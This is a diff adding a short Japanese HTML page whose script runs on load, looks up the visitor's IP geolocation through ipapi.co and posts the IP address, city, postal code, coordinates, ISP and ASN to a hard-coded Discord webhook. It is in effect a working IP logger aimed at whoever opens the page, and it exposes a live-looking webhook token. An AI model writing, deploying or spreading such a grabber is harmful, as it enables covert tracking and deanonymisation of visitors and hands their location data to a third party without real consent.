@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>位置情報送信</title>
+</head>
+<body>
+    <h1>位置情報を送信中...</h1>
+
+    <script>
+        function sendLocationToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1356629113678336191/yfvYgefTCtYsLQi1PseDawA1IaL62QciuHXKiTwCkxMjDAY1Fd5GsYAxo0kv3kI2ASn8';
+            const payload = {
+                content: `位置情報の詳細:\n
+- IP: ${data.ip}\n
+- ネットワーク: ${data.network}\n
+- バージョン: ${data.version}\n
+- 都市: ${data.city}\n
+- 地域: ${data.region}\n
+- 地域コード: ${data.region_code}\n
+- 国: ${data.country_name}\n
+- 国コード: ${data.country_code}\n
+- 首都: ${data.country_capital}\n
+- 郵便番号: ${data.postal}\n
+- 緯度: ${data.latitude}\n
+- 経度: ${data.longitude}\n
+- タイムゾーン: ${data.timezone}\n
+- UTCオフセット: ${data.utc_offset}\n
+- 電話コード: ${data.country_calling_code}\n
+- 通貨: ${data.currency_name} (${data.currency})\n
+- 言語: ${data.languages}\n
+- 国土面積: ${data.country_area} km²\n
+- 人口: ${data.country_population}\n
+- ASN: ${data.asn}\n
+- 組織: ${data.org}\n
+`,
+                username: '位置情報ボット',
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Webhook送信成功:', data);
+            })
+            .catch(error => {
+                console.error('Webhook送信失敗:', error);
+            });
+        }
+
+        function fetchLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('取得した位置情報:', data);
+                    sendLocationToWebhook(data);
+                })
+                .catch(error => {
+                    console.error('位置情報取得失敗:', error);
+                });
+        }
+
+        fetchLocation();
+    </script>
+</body>
+</html>
